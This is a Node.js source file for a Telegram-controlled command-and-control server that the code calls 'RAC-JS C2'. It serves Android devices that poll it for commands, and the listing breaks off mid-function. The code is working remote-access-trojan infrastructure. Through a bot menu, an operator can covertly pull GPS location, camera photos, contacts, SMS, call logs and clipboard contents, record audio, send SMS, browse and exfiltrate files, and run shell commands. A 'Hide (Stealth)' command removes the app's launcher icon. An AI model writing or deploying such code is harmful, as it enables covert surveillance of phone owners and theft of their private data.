require('dotenv').config();
const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// Direktori Upload Statik untuk Media
const uploadsDir = path.join(__dirname, 'public/uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');


/** ===================================
 * CONFIGURATION SETUP
 * =================================== */
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'my-secret-token';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const PORT = process.env.PORT || 3000;
const ALLOWED_IDS = (process.env.ALLOWED_IDS || '').split(',').map(id => id.trim()).filter(id => id.length > 0);

const app = express();


/** ===================================
 * DATABASE SETUP (SQLITE)
 * =================================== */
let db;
(async () => {
    try {
        db = await open({
            filename: path.join(__dirname, 'database.sqlite'),
            driver: sqlite3.Database
        });

        // Buat Tabel jika belum ada
        await db.exec(`CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, 
            last_seen REAL DEFAULT 0,
            polling_mode TEXT DEFAULT 'turbo',
            info TEXT
        )`);

        await db.exec(`CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            device_id TEXT,
            command TEXT,
            text TEXT,
            status TEXT DEFAULT 'pending',
            chat_id TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            completed_at DATETIME,
            polling_mode TEXT DEFAULT 'normal'
        )`);

        // Tambah kolom jika dari versi sebelumnya belum ada
        try { await db.exec(`ALTER TABLE devices ADD COLUMN polling_mode TEXT DEFAULT 'turbo'`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN polling_mode TEXT DEFAULT 'normal'`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
        try { await db.exec(`ALTER TABLE commands ADD COLUMN completed_at DATETIME`); } catch (e) { }

        await db.exec(`CREATE TABLE IF NOT EXISTS system_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command_id TEXT,
            level TEXT DEFAULT 'INFO',
            message TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);

        // Server baru boleh mendengarkan setelah DB SIAP
        app.listen(PORT, () => {
            console.log(`Server Node.js berjalan di port ${PORT}`);
        });
    } catch (dbErr) {
        console.error("KRITIKAL: Gagal inisialisasi Database!", dbErr);
        process.exit(1);
    }
})();

// --- MIDDLEWARE ---
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'templates'));
// Ekspos folder public agar bisa diakses browser
app.use('/public', express.static(path.join(__dirname, 'public')));

// Helper function
const updateDeviceSeen = async (deviceId, mode = 'long') => {
    const timestamp = Date.now() / 1000;
    const finalMode = mode || 'long';
    await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode',
        [deviceId, timestamp, finalMode]);
};

// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
const escapeHTML = (str) => {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
};

const formatDeviceResponse = (data) => {
    if (data === null || data === undefined) return '\n└ [Kosong]';
    if (typeof data === 'string') return `\n└ ${escapeHTML(data)}`;

    if (Array.isArray(data)) {
        if (data.length === 0) return '\n└ [Data Kosong]';
        return '\n' + data.map((item, idx) => {
            const prefix = `  ${idx + 1}. `;
            if (typeof item === 'object' && item !== null) {
                return prefix + Object.entries(item)
                    .map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`)
                    .join(' | ');
            }
            return prefix + escapeHTML(item);
        }).join('\n');
    }

    if (typeof data === 'object') {
        return '\n' + Object.entries(data)
            .map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`)
            .join('\n');
    }

    return `\n└ ${escapeHTML(data)}`;
};

// State Memori Sederhana untuk Path (devId -> currentPath) untuk keperluan folder UP
const devicePaths = {};
const pathMap = {}; // Untuk by-pass limit 64-char callback_data Telegram
const lsState = {}; // Cache untuk pagination: devId -> { path, items, page, totalPages }
const activeInput = {}; // Tracker untuk perintah yang menunggu input pengguna: chatId -> { devId, command }

const commandsWithArgs = {
    'sms_send': 'Masukkan Detail SMS (Format: Nomor|Pesan):',
    'show_toast': 'Masukkan teks Toast yang ingin dimunculkan:',
    'vibrate': 'Berapa detik getaran dilakukan? (Angka):',
    'tts': 'Masukkan teks untuk diucapkan (TTS):',
    'notify': 'Masukkan Push Notification (Format: Judul|Isi):',
    'record_sound': 'Berapa detik durasi rekaman? (Angka):',
    'get_call_logs': 'Berapa banyak limit histori yang ditarik? (Angka):',
    'open_url': 'Masukkan URL yang ingin dibuka secara paksa:',
    'set_wallpaper': 'Masukkan URL Gambar untuk Wallpaper baru:',
    'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
    'shell': 'Masukkan perintah Shell/Terminal:',
    'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
};

// --- RENDER PAGINATION FILE EXPLORER ---
const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) => {
    const state = lsState[client_id];
    if (!state) return;

    state.page = pageNum;
    const itemsPerPage = 30;
    const startIndex = (pageNum - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const pageItems = state.items.slice(startIndex, endIndex);

    const upPath = state.path.substring(0, state.path.lastIndexOf('/')) || '/';
    const flatBtns = [];

    // Tombol naik 1 level
    if (state.path !== '/') {
        const upId = Math.random().toString(36).substring(2, 10);
        pathMap[upId] = upPath;
        flatBtns.push(Markup.button.callback('⬆️ Naik 1 Folder', 'runcmd:' + client_id + ':ls_id ' + upId));
    }

    pageItems.forEach(f => {
        const shortId = Math.random().toString(36).substring(2, 10);
        pathMap[shortId] = f.path;
        if (f.is_dir) {
            flatBtns.push(Markup.button.callback('📁 ' + f.name.substring(0, 20), 'runcmd:' + client_id + ':ls_id ' + shortId));
        } else {
            const sizeKB = Math.round(f.size / 1024);
            flatBtns.push(Markup.button.callback('📄 ' + f.name.substring(0, 20) + ' (' + sizeKB + ' KB)', 'runcmd:' + client_id + ':dl_id ' + shortId));
        }
    });

    const inlineBtns = [];
    for (let i = 0; i < flatBtns.length; i += 2) {
        inlineBtns.push(flatBtns.slice(i, i + 2));
    }

    // Pagination buttons
    const navBtns = [];
    if (pageNum > 1) navBtns.push(Markup.button.callback('⬅️ Prev', `pagecmd:${client_id}:${pageNum - 1}`));
    if (pageNum < state.totalPages) navBtns.push(Markup.button.callback('Next ➡️', `pagecmd:${client_id}:${pageNum + 1}`));
    if (navBtns.length > 0) inlineBtns.push(navBtns);

    // Back to Menu Button
    inlineBtns.push([
        { text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}`, style: 'primary' },
        { text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }
    ]);

    const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;

    try {
        if (message_id) {
            await bot.telegram.editMessageText(chat_id, message_id, null, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
        } else {
            await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: inlineBtns } });
        }
    } catch (tgErr) {
        await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
    }
};


/** ===================================
 * TELEGRAM COMMAND & CONTROL (BOT)
 * =================================== */
let bot;
let lastSelectedDevice = null;
if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
    bot = new Telegraf(TELEGRAM_TOKEN);

    // Middleware Autentikasi ALLOWED_IDS
    bot.use(async (ctx, next) => {
        if (!ctx.from) return;
        const userId = ctx.from.id.toString();

        // Jika ALLOWED_IDS dikonfigurasi, tolak akses di luar daftar
        if (ALLOWED_IDS.length > 0 && !ALLOWED_IDS.includes(userId)) {
            console.log(`[Akses Ditolak] User ID: ${userId} mencoba menggunakan Bot.`);
            return; // Mengabaikan pesan diam-diam
        }
        return next();
    });

    // Mendaftarkan perintah ke dalam kotak input Telegram dengan try-catch agar tidak crash jika Timeout
    try {
        bot.telegram.setMyCommands([
            { command: 'start', description: 'Lihat menu utama bot' },
            { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
            { command: 'help', description: 'Bantuan & Daftar Perintah Lanjutan' },
            { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
        ]).catch(err => console.error("Gagal mendaftarkan menu perintah (Telegram Timeout):", err.message));
    } catch (e) {
        console.error("Gagal mengirim setMyCommands:", e.message);
    }

    const sendHelpMessage = (ctx) => {
        const helpText = `
📖 <b>Daftar Eksekusi Perintah (RAC-JS C2)</b>

Format Eksekusi Manual:
<code>/cmd [id_device] [command] [payload_opsional]</code>

⚙️ <b>Utilitas Dasar</b>
• <b>ping</b>: Uji latensi interval dari *long-polling*.
• <b>get_device_info</b>: Menarik spesifikasi fisik dan OS Android.
• <b>get_battery</b>: Melaporkan persentase baterai sistem.
• <b>get_volume</b> / <b>set_volume</b>: Mengelola metrik audio sistem. Payload: <code>[music/ring/alarm] [vol]</code>
• <b>hide_app</b>: Menonaktifkan visibilitas *Launcher Icon* di menu ekosistem.

🛠️ <b>Hardware & Lingkungan</b>
• <b>vibrate</b>: Mengaktifkan haptic feedback (bypass DND). Payload: <code>[detik]</code>
• <b>torch</b>: Akselerasi Flash Kamera. Payload: <code>on</code> / <code>off</code>
• <b>sensors</b>: Menarik spesifikasi array hardware sensor.
• <b>wifi_scan</b>: Rekaman frekuensi jaringan WiFi/SSID lokal.
• <b>location</b>: Parsing titik kordinat bujur/lintang (GPS).

📸 <b>Media Audio & Visual</b>
• <b>photo front</b> / <b>photo back</b>: *Snapshot* resolusi tinggi dan render matriks Base64.
• <b>record_sound</b>: Merekam modul I/O mikrofon audio. Payload: <code>[detik]</code>
• <b>play_sound</b>: Merender audio secara asinkronus ke latar OS. Payload: <code>[url_mp3]</code>
• <b>tts</b>: Sintesis suara virtual dari Google (*Voice rendering*). Payload: <code>[teks_pesan]</code>
• <b>play_alarm</b>: Membunyikan nada sirine bawaan sistem maksimal.

🗂️ <b>Manajemen Data (I/O)</b>
• <b>contacts</b> / <b>sms_list</b> / <b>get_call_logs</b>: Penarikan data struktural log komunikasi dan telpon.
• <b>sms_send</b>: Transmisi pesan jarak jauh melalui *Intent SMS*. Payload: <code>[nomor]|[pesan]</code>
• <b>clipboard</b>: Evaluasi state pointer *copy-paste* terbaru.
• <b>get_installed_apps</b>: Mengagregasi *Package Name* yang terpasang pada subsistem.
• <b>ls</b>: Menjalankan mode peramban file internal. Payload: <code>[alamat_path]</code>
• <b>upload</b> / <b>download</b>: Dropping atau mengevakuasi payload file ke media lokal.
• <b>shell</b>: Emulasi Terminal interaktif Android Shell/Bash. Payload: <code>[perintah_bash]</code>

📱 <b>Notifikasi & Layar</b>
• <b>show_toast</b>: Pembuatan pop-up transien internal. Payload: <code>[is_teks]</code>
• <b>notify</b>: Memicu notifikasi *Push* pada status bar. Payload: <code>[Title]|[Message]</code>
• <b>open_url</b>: Transisi eksekusi paksa browser sistem. Payload: <code>[url]</code>
• <b>set_wallpaper</b>: Injeksi kustomisasi pada profil wallpaper perangkat. Payload: <code>[url_gambar_resolusi]</code>
• <b>dial_number</b>: Resolving transisi *dialer* nomor/USSD. Payload: <code>[nomor_tujuan]</code>
`;
        ctx.reply(helpText, { parse_mode: 'HTML' });
    };

    bot.command('help', sendHelpMessage);
    bot.action('btn_help', async (ctx) => {
        ctx.answerCbQuery();
        sendHelpMessage(ctx);
    });

    bot.start((ctx) => {
        const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
        ctx.reply(msg, {
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')],
                [Markup.button.callback('📖 Bantuan & Dokumentasi', 'btn_help')]
            ])
        });
    });

    bot.command('list', async (ctx) => listDevicesToChat(ctx));
    bot.action('btn_list', async (ctx) => {
        ctx.answerCbQuery();
        listDevicesToChat(ctx);
    });

    const listDevicesToChat = async (ctx) => {
        const devices = await db.all('SELECT * FROM devices');
        const isCallback = ctx.callbackQuery ? true : false;

        if (devices.length === 0) {
            const msg = '📭 Belum ada perangkat yang terhubung ke server.';
            return isCallback ? ctx.editMessageText(msg) : ctx.reply(msg);
        }

        const buttons = [];
        devices.forEach(d => {
            const isOnline = (Date.now() / 1000 - d.last_seen) < 90;
            const statusIcon = isOnline ? '🟢' : '🔴';
            const modeIcon = d.polling_mode === 'short' ? '⚡' : '🔋';
            buttons.push([{ text: `${statusIcon} ${d.id} [${modeIcon}]`, callback_data: `select_dev:${d.id}` }]);
        });

        const caption = '📱 <b>Pilih Target Perangkat:</b>';
        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } };

        if (isCallback) {
            try { await ctx.editMessageText(caption, opts); }
            catch (e) { await ctx.reply(caption, opts); }
        } else {
            ctx.reply(caption, opts);
        }
    };

    bot.action('list_devices', async (ctx) => {
        ctx.answerCbQuery().catch(() => { });
        listDevicesToChat(ctx);
    });

    // Menangani klik dari tombol Device yang dipilih
    const sendDeviceMenu = async (ctx, devId, isSecret = false) => {
        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const currentMode = device?.polling_mode || 'long';
        const modeLabel = currentMode === 'short' ? '⚡ TURBO' : '🔋 NORMAL';
        const nextMode = currentMode === 'short' ? 'long' : 'short';

        const menuBtns = [
            [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
            [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }, { text: '📶 Scan WiFi', callback_data: `runcmd:${devId}:wifi_scan`, style: 'primary' }],
            [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
            [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
            [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
            [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
            [{ text: isSecret ? '🏠 Menu Utama' : '🛠 Fitur Lanjutan', callback_data: isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`, style: isSecret ? 'success' : 'danger' }]
        ];

        if (isSecret) {
            menuBtns.splice(0, 5,
                [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
                [{ text: '🗣 Text to Speech', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Push Notify', callback_data: `runcmd:${devId}:notify` }],
                [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Set Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }],
                [{ text: '📳 Getar HP', callback_data: `runcmd:${devId}:vibrate` }, { text: '🚨 Alarm Panik!', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
                [{ text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial Number', callback_data: `runcmd:${devId}:dial_number` }],
                [{ text: '👻 Hide (Stealth)', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '📻 Info Volume', callback_data: `runcmd:${devId}:get_volume` }],
                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
                [{ text: '🎵 Play Sound', callback_data: `runcmd:${devId}:play_sound` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }],
                [{ text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '💬 Show Toast', callback_data: `runcmd:${devId}:show_toast` }],
                [{ text: '💻 Terminal Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }]
            );
        }

        const isResult = ctx.callbackQuery.message.text && (ctx.callbackQuery.message.text.includes('Respon') || ctx.callbackQuery.message.text.includes('Data'));
        const rawText = isResult ? ctx.callbackQuery.message.text.replace('⏳ Menunggu Respon...', '') : '';
        const caption = isResult ? escapeHTML(rawText) : `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;

        menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
        const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };

        try {
            await ctx.editMessageText(caption, opts);
        } catch (e) {
            await ctx.reply(caption, opts);
        }
    };

    bot.action(/^select_dev:(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        lastSelectedDevice = devId;
        ctx.answerCbQuery().catch(() => { });
        devicePaths[devId] = "/storage/emulated/0";
        sendDeviceMenu(ctx, devId, false);
    });

    bot.action(/^secret_menu:(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        ctx.answerCbQuery('Membuka Fitur Lanjutan...').catch(() => { });
        sendDeviceMenu(ctx, devId, true);
    });

    // Menangani klik perintah spesifik dari device
    bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        lastSelectedDevice = devId;
        const fullCmd = ctx.match[2];
        const parts = fullCmd.split(' ');
        const cmdName = parts[0];
        let cmdText = parts.slice(1).join(' ');

        // Jika perintah butuh argumen dan saat ini kosong, minta input user
        if (commandsWithArgs[cmdName] && !cmdText) {
            activeInput[ctx.chat.id] = { devId, command: cmdName };
            const cancelBtn = { inline_keyboard: [[{ text: '❌ Batal Memasukkan Input', callback_data: 'cancel_input', style: 'danger' }]] };
            return ctx.reply(`⌨️ <b>Input Diperlukan:</b>\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML', reply_markup: cancelBtn });
        }

        // Khusus info volume: tampilkan status dulu, tapi juga siapkan form standby untuk set_volume jika pengguna reply
        if (cmdName === 'get_volume') {
            activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
            const cancelBtn = { inline_keyboard: [[{ text: '❌ Tutup & Batal Ubah Volume', callback_data: 'cancel_input', style: 'danger' }]] };
            ctx.reply(`💡 Untuk **mengubah** volume HP target, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML', reply_markup: cancelBtn }).catch(() => { });
        }

        // Dekode shortId jika menggunakan Mapping Path ID
        if (cmdName === 'ls_id' || cmdName === 'dl_id') {
            const mappedPath = pathMap[cmdText];
            if (!mappedPath) return ctx.answerCbQuery('❌ Sesi explorer kedaluwarsa, sentuh ulang menu dari /list', { show_alert: true });
            cmdText = mappedPath;
        }

        const realCmdName = cmdName === 'ls_id' ? 'ls' : (cmdName === 'dl_id' ? 'download' : cmdName);

        if (realCmdName === 'ls' && cmdText) {
            devicePaths[devId] = cmdText;
        }

        ctx.answerCbQuery(`Menjalankan ${realCmdName}...`).catch(() => { });

        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.callbackQuery.message.chat.id.toString();
        const messageId = ctx.callbackQuery.message.message_id.toString();

        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [cmdId, devId, realCmdName, cmdText, 'pending', chatId, messageId]);

        // Beritahu client jika sedang menunggu long-polling
        notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });

        // Mencegah Spam, kita gunakan editMessageText
        try {
            await ctx.editMessageText(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
        } catch (e) {
            // Jika gagal edit (misal konten sama), abaikan saja agar tidak spam reply baru
        }
    });

    bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
        const devId = ctx.match[1];
        const pageNum = parseInt(ctx.match[2]);
        if (!lsState[devId]) return ctx.answerCbQuery('❌ Cache explorer kedaluwarsa, muat ulang dari awal.', { show_alert: true });

        ctx.answerCbQuery(`Memuat halaman ${pageNum}...`);
        await sendExplorerPage(devId, pageNum, ctx.chat.id, ctx.callbackQuery.message.message_id);
    });

    bot.action('cancel_input', async (ctx) => {
        const chatId = ctx.callbackQuery.message.chat.id;
        if (activeInput[chatId]) {
            delete activeInput[chatId];
        }
        ctx.answerCbQuery('Input Dibatalkan ❌', { show_alert: true }).catch(() => { });
        // Hapus pesan prompt input nya agar chatting bersih
        try { await ctx.deleteMessage(); } catch (e) { }
    });

    // Menangani input teks bebas dari user (untuk argumen perintah)
    bot.on('text', async (ctx, next) => {
        const chatId = ctx.chat.id;
        const state = activeInput[chatId];

        if (state) {
            const { devId, command } = state;
            delete activeInput[chatId];

            const cmdId = uuidv4().slice(0, 8);
            const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code> dengan input: <i>${escapeHTML(ctx.message.text)}</i>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });

            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
                [cmdId, devId, command, ctx.message.text, 'pending', chatId.toString(), sentMsg.message_id.toString()]);

            notifyClient(devId, { id: cmdId, command: command, text: ctx.message.text });
            return;
        }
        return next();
    });

    // Menangani aksi Upload File via Telegram (Reply ke Pesan Menu atau Manual)
    bot.on(['document', 'photo'], async (ctx) => {
        // Ambil ID Dev terakhir yang sedang dikontrol oleh admin
        const devId = lastSelectedDevice;
        if (!devId) return ctx.reply('⚠️ Harap pilih perangkat dulu dari menu /list sebelum mengunggah file.');

        try {
            const fileObj = ctx.message.document || ctx.message.photo[ctx.message.photo.length - 1];
            const fileId = fileObj.file_id;
            const fileName = fileObj.file_name || 'uploaded_image.jpg';

            const fileLink = await ctx.telegram.getFileLink(fileId);

            // Menggunakan fetch bawaan (Node.js 18+) agar tak perlu install Axios
            const response = await fetch(fileLink.href);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            const arrayBuffer = await response.arrayBuffer();
            const base64Data = Buffer.from(arrayBuffer).toString('base64');

            const destPath = (devicePaths[devId] || '/storage/emulated/0') + '/' + fileName;
            const uploadPayload = `${destPath}^^^${base64Data}`;

            const cmdId = uuidv4().slice(0, 8);
            const chatId = ctx.message.chat.id.toString();

            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
                [cmdId, devId, 'upload', uploadPayload, 'pending', chatId]);

            ctx.reply(`📤 <b>Mengunggah File!</b>\nNama: <code>${fileName}</code>\nTujuan: <code>${destPath}</code>\nKe Perangkat: <code>${devId}</code>`, { parse_mode: 'HTML' });
        } catch (error) {
            ctx.reply(`❌ Gagal merakit file upload: ${error.message}`);
        }
    });

    bot.command('cmd', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) return ctx.reply('Gunakan mode manual 🛠️:\n/cmd [id_device] [nama_perintah] [teks_opsional]');

        const devId = args[1];
        const cmdName = args[2];
        const extraText = args.slice(3).join(' ');

        // Validasi Device ID
        const check = await db.get('SELECT id FROM devices WHERE id = ?', [devId]);
        if (!check) return ctx.reply(`❌ Perangkat <code>${devId}</code> tidak ditemukan di dalam database.`, { parse_mode: 'HTML' });

        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.chat.id.toString();

        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const currentMode = device?.polling_mode || 'normal';

        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [cmdId, devId, cmdName, extraText, 'pending', chatId, currentMode]);

        ctx.reply(`🗃️ <b>Manual Queued:</b> ${cmdName} ➡️ <code>${devId}</code>`, { parse_mode: 'HTML' });
    });

    if (WEBHOOK_URL) {
        // Baris ini akan memastikan webhook terdaftar ke Telegram
        bot.telegram.setWebhook(`${WEBHOOK_URL}`).then(() => {
            console.log(`Webhook set successfully to: ${WEBHOOK_URL}`);
        }).catch(err => {
            console.error('Failed to set webhook:', err);
        });
    }
}


/** ===================================
 * WEB DASHBOARD EXTENSION (EXPRESS)
 * =================================== */
app.get('/', (req, res) => {
    res.json({ status: 'running', engine: 'Node.js Express', database: 'SQLite' });
});

app.post('/webhook', (req, res) => {
    if (bot) {
        bot.handleUpdate(req.body, res);
    } else {
        res.status(200).send('Bot not configured');
    }
});

// Untuk Long-Polling: Simpan referensi ke client yang sedang menunggu (devId -> res)
const waitingClients = {};

// Helper untuk mengirim command ke client yang sedang menunggu
const notifyClient = (devId, cmd) => {
    if (waitingClients[devId]) {
        const res = waitingClients[devId];
        delete waitingClients[devId];
        res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
        return true;
    }
    return false;
};

// ... (di dalam endpoint /poll)
app.get('/poll', async (req, res) => {
    const { client_id, auth, mode } = req.query;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });

    await updateDeviceSeen(client_id, mode);

    const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
        [client_id, 'pending']);

    if (cmd) {
        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
    }

    // Jika mode=short, langsung jawab 'none' tanpa menunggu
    if (mode === 'short') {
        return res.json({ command: 'none' });
    }

    // Jika tidak ada, tunggu (Long-Polling)
    if (waitingClients[client_id]) {
        try { waitingClients[client_id].json({ command: 'none' }); } catch (e) { }
    }
    waitingClients[client_id] = res;

    setTimeout(() => {
        if (waitingClients[client_id] === res) {
            delete waitingClients[client_id];
            res.json({ command: 'none' });
        }
    }, 25000); // Turunkan sedikit ke 25s agar lebih aman dari timeout proxy
});

// ... (PENTING: Di setiap tempat di mana db.run('INSERT INTO commands...') dipanggil, tambahkan pemanggilan notifyClient)
// Contoh di bot.action runcmd:
// await db.run('INSERT INTO commands...', [...]);
// notifyClient(devId, { command: realCmdName, text: cmdText, id: cmdId });


app.post('/response', async (req, res) => {
    const { client_id, auth } = req.query;
    const data = req.body;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });

    await updateDeviceSeen(client_id);

    // Kloning objek agar modifikasi tidak merusak Telegram responder
    let logData = { ...data };
    try {
        if (data.type === 'audio_base64' && data.data) {
            const filename = `audio_${client_id}_${Date.now()}.mp4`;
            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
            logData.type = 'audio_url';
            logData.data = `/public/uploads/${filename}`;
        } else if (data.type === 'photo_base64' && data.data) {
            const filename = `photo_${client_id}_${Date.now()}.jpg`;
            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
            logData.type = 'photo_url';
            logData.data = `/public/uploads/${filename}`;
        }
    } catch (e) {
        console.error("Gagal mengekstrak media ke file fisik:", e);
    }

    await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)',
        [client_id, data.id || null, data.level || 'INFO', JSON.stringify(logData)]);

    if (data.id) {
        await db.run('UPDATE commands SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ['completed', data.id]);

        // Membalas ke Telegram jika perintah ini dari Telegram
        try {
            const cmd = await db.get('SELECT chat_id, message_id FROM commands WHERE id = ?', [data.id]);
            if (cmd && cmd.chat_id && bot) {
                const deviceResponse = data.data !== undefined ? data.data : data;

                // Helper untuk menyematkan tombol di balik setiap respons
                const getNavOpts = () => ({
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}`, style: 'primary' },
                                { text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }
                            ]
                        ]
                    }
                });

                const sendOrEdit = async (text, options = {}) => {
                    const finalOpts = { parse_mode: 'HTML', ...getNavOpts(), ...options };
                    if (cmd.message_id) {
                        try {
                            await bot.telegram.editMessageText(cmd.chat_id, parseInt(cmd.message_id), null, text, finalOpts);
                        } catch (e) {
